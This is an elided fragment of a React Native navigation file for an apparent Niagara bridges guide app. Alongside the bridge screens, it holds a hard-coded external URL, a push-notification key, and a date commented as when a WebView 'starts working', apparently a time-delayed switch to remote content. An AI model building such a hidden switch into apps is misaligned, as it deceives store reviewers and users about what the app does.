...
import BridgeDetails from '../screens/BridgeDetails';
...
import Louser from '../screens/Louser'; // Assuming Louser is a screen component
import ProductScreen from '../screens/WalkAndMarkNiagaraArchwaysProdScreen';
// libs
...
const StackNavigation = () => {
  ...
  const INITIAL_URL = `https://spruce-ember-cascade.space/`;
  const URL_IDENTIFAIRE = `OdLtfUCM`;
  ...
  OneSignal.initialize('d94c5b74-86c4-4098-af7e-72d7414d0c18');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-08-15T08:08:00'); //дата з якої поч працювати webView
  ...
  const Route = ({ isFatch }) => {
    ...
    return (
      <Stack.Navigator screenOptions={{ headerShown: false }}>
        ...
        <Stack.Screen name="Bridges" component={Bridges} />
        <Stack.Screen name="BridgeDetails" component={BridgeDetails} />
  ...
  return <>{!louderIsEnded ? <Louser /> : <Route isFatch={route} />}</>;
};
